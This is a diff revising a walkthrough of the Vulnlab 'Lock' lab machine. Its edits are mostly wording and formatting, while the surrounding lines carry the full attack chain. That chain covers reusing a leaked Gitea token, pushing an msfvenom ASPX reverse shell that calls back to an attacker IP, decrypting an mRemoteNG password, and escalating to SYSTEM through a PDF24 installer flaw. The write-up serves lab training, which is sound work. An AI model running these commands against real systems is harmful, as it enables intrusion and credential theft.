@@ -135,13 +135,13 @@ Next we have port 3000. There's a `Gitea` instance running here and we can even 
 
 ![](../../../assets/lock-http-gitea2.png)
 
-The script is basically used for downloading repositories. What is interesting is that it's using a `Gitea` authorization token from an environment variable.
+The script is basically used for fetching information about repositories. What is interesting is that it's using a `Gitea` authorization token from an environment variable.
 
 ```
 personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
 ```
 
-What I always like to do when I'm looking at `Gitea` or other git-based solutions are past commits. There's a chance that authors may have left some sensitive information in previous commits since the repository might have been private at the time.
+What I always like to do when I'm looking at `Gitea` or other git-based solutions are past commits. There's a chance that authors may have left some sensitive information in previous commits since the repository might have been private at the time. Especially as we can see that there some action with `GITEA_ACCESS_TOKEN` going on.
 
 ![](../../../assets/lock-http-gitea3.png)
 
@@ -151,7 +151,7 @@ There's indeed a hardcoded `Gitea` token in the previous commit. That's excellen
 
 ### Enumerating ellen.freeman's repositories
 
-Let's try to use the token we found earlier. What we want to do is to enumerate the user's repositories. As the script suggests we can use the `api/v1/user/repos` endpoint. For this one we can user `curl` and specify the authorization header. When successful, this provides a big JSON response. Let's make it a bit easier to read and parse the output with `jq`.
+Let's try to use the token we found earlier. What we want to do is to enumerate the user's repositories. As the script we found in `dev_scripts` repository suggests, we can use the `api/v1/user/repos` endpoint to fetch information about available repositories. For this one we can user `curl` and specify the authorization header. When successful, this provides a big JSON response. Let's make it a bit easier to read and parse the output with `jq`.
 
 ```
 curl -H 'Authorization: token <REDACTED>' http://10.10.71.234:3000/api/v1/user/repos | jq
@@ -181,7 +181,7 @@ curl -H 'Authorization: token <REDACTED>' http://10.10.71.234:3000/api/v1/user/r
 .
 ```
 
-There indeed is one private repository called `website`. We may assume that it's the repository of the web site running on port 80. To examine this repository, we have to clone it. What's interesting is that `Gitea` kindly allows us to use access tokens instead of passwords. This way we can authenticate to the `Gitea` as ellen.freeman and clone the repository to our machine.
+There indeed is one private repository called `website`. We may assume that it's the repository of the web site running on port 80. To examine this repository, we have to clone it. What's interesting, is that `Gitea` kindly allows us to use access tokens as passwords. This way we can authenticate to the `Gitea` as ellen.freeman and clone the repository to our machine.
 
 ```
 ➜  lock git clone http://ellen.freeman:<REDACTED>@10.10.71.234:3000/ellen.freeman/website.git
@@ -205,7 +205,7 @@ drwxr-xr-x 6 qurius qurius  4096 Jan 21 21:35 assets
 -rw-r--r-- 1 qurius qurius   130 Jan 21 21:35 readme.md
 ```
 
-By the contents of the `index.html` file in the repository we can confirm that this indeed is the repository of the web site running on port 80. However, there are some other files it might be worth to look at. Let's take look at `readme.md`.
+By the contents of the `index.html` file in the repository, we can confirm that this indeed is the repository of the web site running on port 80. Let's look at some other files in the repository. Let's take look at `readme.md` first.
 
 ```
 ➜  website git:(main) cat readme.md
@@ -214,11 +214,11 @@ By the contents of the `index.html` file in the repository we can confirm that t
 CI/CD integration is now active - changes to the repository will automatically be deployed to the webserve
 ```
 
-This is interesting. This would mean that if we add a file to this repository, create commit and push with the access token we found earlier, we could upload a reverse shell. That's exactly what we are going to do.
+This is interesting. This would mean that if we add a file to this repository, create commit and push with the access token we found earlier, we could upload a web shell. That's exactly what we are going to do.
 
 ### Pushing reverse shell to the web server
 
-As you may recall thinking back to the reconnaissance phase, we discovered that the web site is running on `ASP.NET`. That means that we can create a malicious `.aspx` file and get code execution that way. We can generate such reverse shell with `msfvenom`.
+As you may recall from the reconnaissance phase, we discovered that the web site is running on `ASP.NET`. That means that we can create a malicious `.aspx` file and get code execution that way. We can generate such reverse shell file with `msfvenom`.
 
 ```
 ➜  website git:(main) ✗ msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.109 LPORT=443 -f aspx -o shell.aspx
@@ -253,7 +253,7 @@ To http://10.10.71.234:3000/ellen.freeman/website.git
 
 ## Getting foothold
 
-As mentioned in the `readme.md` file, by pushing the reverse shell file to the repository the change should be deployed right away to the web server. Let's try to access the file with `curl` and see if we get a reverse shell back.
+As mentioned in the `readme.md` file, by pushing the reverse shell file to the repository, the change should be deployed right away to the web server. Let's try to access the file with `curl` and see if we get a reverse shell back.
 
 ```
 curl http://10.10.71.234/shell.aspx
@@ -273,13 +273,13 @@ lock\ellen.freeman
 c:\windows\system32\inetsrv>
 ```
 
-Great, we have a foothold as ellen.freeman! However, there is no flag. Let's do some post exploitation work.
+Great, we have a foothold as ellen.freeman! However, there is no user flag. Let's do some post exploitation work.
 
 ## Getting user
 
 ### Looking at file system
 
-Let's take a look at file system. There are some git-related files in the ellen.freeman's home folder, but those do not lead us to anything we already do not know. Let's take a look at user's documents.
+Let's take a look at file system. There are some git-related files in the ellen.freeman's home folder, but those do not lead us to anything we already do not know or own. Let's take a look at user's documents.
 
 ```
 C:\Users\ellen.freeman\Documents>dir
@@ -298,18 +298,18 @@ dir
 
 There is some interesting `config.xml` file. Let's take a closer look.
 
-```xml
+```
 <?xml version="1.0" encoding="utf-8"?>
 <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
     <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
 </mrng:Connections>
 ```
 
+By looking at the file we can see that it is a sort of RDP connection configuration file for user `Gale.Dekarios`. There is a password field, however the password is encrypted with `AES-GCM`. Let's do some research on what we can do with this.
+
 ### Decrypting mRemoteNG config file
 
-After some time googling I discovered that the config file is used by a remote connection software called `mRemoteNG`. After some more research I found out that there is a way to decrypt the password in the config file. I stumbled upon this repository.
-
-https://github.com/gquere/mRemoteNG_password_decrypt
+After some time googling I discovered that the config file is used by a remote connection software called `mRemoteNG`. After some more research I found out that there is a way to decrypt the password in the config file. I stumbled upon [this](https://github.com/gquere/mRemoteNG_password_decrypt) repository that allows us to decrypt the password from the config file.
 
 The script basically takes the config file and password (optional) as arguments and outputs decrypted password. We do not have any password, but the script still works. This is possible, because the password in the config file we found was encrypted by a default password which is hardcoded in the script. After running the script we get another set of credentials.
 
@@ -323,7 +323,7 @@ Password: <REDACTED>
 
 ### Logging to RDP as Gale.Dekarios
 
-As we saw from the Nmap scan, the port 3389 is open and we can RDP to the box as `Gale.Dekarios`.
+As we saw from the Nmap scan, the port 3389 is open and we can RDP into the box as `Gale.Dekarios`.
 
 ```
 xfreerdp /u:Gale.Dekarios /p:<REDACTED> /v:10.10.71.234 /size:1280x720
@@ -335,15 +335,15 @@ This was successful and we can finally read the user flag.
 
 ## Getting SYSTEM
 
-After connecting via RDP, we can see some shortcuts to software installed on the machine. One of these is `PDF24`. If we recall back the the web site we saw at the beginning there already were some references to some PDF software. Let's try to find some public vulnerabilities.
+After connecting via RDP, we can see some shortcuts to software installed on the machine. One of these is `PDF24`. If we recall back the the reconnaissance phase, the web site we saw already mentioned some PDF software. Let's try to find some public vulnerabilities for `PDF24`.
 
 Almost right away I stumbled on [this](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) article from SEC Consult. The article does a great job on explaining the vulnerability and necessary steps to reproduce. Let's jump into it.
 
 ### Prerequisites
 
-The exploit has a couple of prerequisites. For the exploit to work, the PDF24 had to be installed via a MSI installer. The installer itself is also necessary for the exploit, however I already discovered it during post exploitation enumeration as user Gale.Dekarios.
+The exploit has a couple of prerequisites. For the exploit to work, the PDF24 has to be installed via a MSI installer. The installer itself is also necessary for the exploit as I is used to start an installation repair process.
 
-By searching for hidden files/folders in the root directory, we can see that there is a hidden folder called `_install`.
+By looking around I found something interesting in the `C:\` directory. After searching for hidden files and folders, we can see that there indeed is a hidden folder called `_install`.
 
 ```
 C:\>dir /a:h
@@ -351,7 +351,15 @@ Volume in drive C has no label.                                                 
 
 Directory of C:\
 
-12/28/2023  06:17 AM    <DIR>          $Recycle.Bin                                                          12/27/2023  12:38 PM    <DIR>          $WinREAgent                                                           12/27/2023  06:14 PM    <JUNCTION>     Documents and Settings [C:\Users]                                     01/21/2024  11:55 AM            12,288 DumpStack.log.tmp                                                     01/21/2024  11:55 AM     1,207,959,552 pagefile.sys                                                          12/28/2023  11:24 AM    <DIR>          ProgramData                                                           12/27/2023  06:14 PM    <DIR>          Recovery                                                              12/27/2023  06:14 PM    <DIR>          System Volume Information                                             12/28/2023  11:23 AM    <DIR>          _install                                                             
+12/28/2023  06:17 AM    <DIR>          $Recycle.Bin
+12/27/2023  12:38 PM    <DIR>          $WinREAgent
+12/27/2023  06:14 PM    <JUNCTION>     Documents and Settings [C:\Users]
+01/21/2024  11:55 AM            12,288 DumpStack.log.tmp
+01/21/2024  11:55 AM     1,207,959,552 pagefile.sys
+12/28/2023  11:24 AM    <DIR>          ProgramData
+12/27/2023  06:14 PM    <DIR>          Recovery
+12/27/2023  06:14 PM    <DIR>          System Volume Information
+12/28/2023  11:23 AM    <DIR>          _install
 			   2 File(s)  1,207,971,840 bytes
 			   7 Dir(s)   5,608,247,296 bytes free
 ```
@@ -364,14 +372,14 @@ Volume Serial Number is A03D-9CEF
 
 Directory of C:\_install
 
-12/28/2023  11:21 AM        60,804,608 Firefox Setup 121.0.msi                                               12/28/2023  05:39 AM        43,593,728 mRemoteNG-Installer-1.76.20.24615.msi                                 12/14/2023  10:07 AM       462,602,240 pdf24-creator-11.15.1-x64.msi
+12/28/2023  11:21 AM        60,804,608 Firefox Setup 121.0.msi
+12/28/2023  05:39 AM        43,593,728 mRemoteNG-Installer-1.76.20.24615.msi
+12/14/2023  10:07 AM       462,602,240 pdf24-creator-11.15.1-x64.msi
 			   3 File(s)    567,000,576 bytes
 			   0 Dir(s)   5,607,112,704 bytes free
 ```
 
-Another thing we'll need is the `SetOpLock.exe` binary as mentioned in the article. This comes in suite of multiple symbolic link testing utilities and is available in the following GitHub repository.
-
-https://github.com/googleprojectzero/symboliclink-testing-tools
+Another thing we'll need is the `SetOpLock.exe` binary as mentioned in the article. This comes in suite of multiple symbolic link testing utilities and is available in [this](https://github.com/googleprojectzero/symboliclink-testing-tools) GitHub repository.
 
 ```
 iwr http://10.8.0.109/SetOpLock.exe -o SetOpLock.exe
@@ -415,6 +423,6 @@ Great! We are now SYSTEM and can read the root flag.
 
 ## Final thoughts
 
-I really enjoyed this machine! Thanks [xct](https://twitter.com/xct_de) and [kozie](https://twitter.com/k0zmer) for creating it. What I liked the most is the real life applicability which is a high quality standard on [Vulnlab](https://www.vulnlab.com/). Looking forward to many more.
+I really enjoyed this machine! Thanks [xct](https://twitter.com/xct_de) and [kozie](https://twitter.com/k0zmer) for creating it. What I liked the most were the real life aspects of machine which is a high quality standard on [Vulnlab](https://www.vulnlab.com/). Looking forward to many more.
 
-Thank you for reading and have a nice day :)
+If you bared with me to the very end I thank you for reading and I hope you'll have a great day :)
